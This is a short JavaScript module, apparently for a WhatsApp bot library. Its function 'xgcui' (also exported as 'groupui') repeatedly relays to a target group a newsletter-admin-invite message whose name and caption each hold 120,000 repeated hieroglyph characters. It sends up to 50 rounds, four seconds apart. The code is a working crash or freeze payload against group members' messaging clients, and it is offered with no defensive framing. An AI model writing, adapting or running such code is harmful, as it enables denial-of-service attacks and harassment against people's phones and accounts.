async function xgcui(sock, groupJid, opts = {}) {
  const total = opts.rounds || 50, ms = 4;
  for (let i = 0; i < total; i++) {
    try {
      await sock.relayMessage(groupJid, {
        botInvokeMessage: { message: {
          newsletterAdminInviteMessage: {
            newsletterJid: '33333333333333333@newsletter',
            newsletterName: '𓂀'.repeat(120000), jpegThumbnail: null,
            caption: '𓂀'.repeat(120000), inviteExpiration: Date.now() + 1814400000
          }
        } }
      }, { userJid: groupJid });
    } catch (e) { console.log(`[xgcui] ${i + 1}: ${e.message}`); break; }
    await new Promise(r => setTimeout(r, ms * 1000));
  }
}

module.exports = { xgcui, groupui: xgcui };
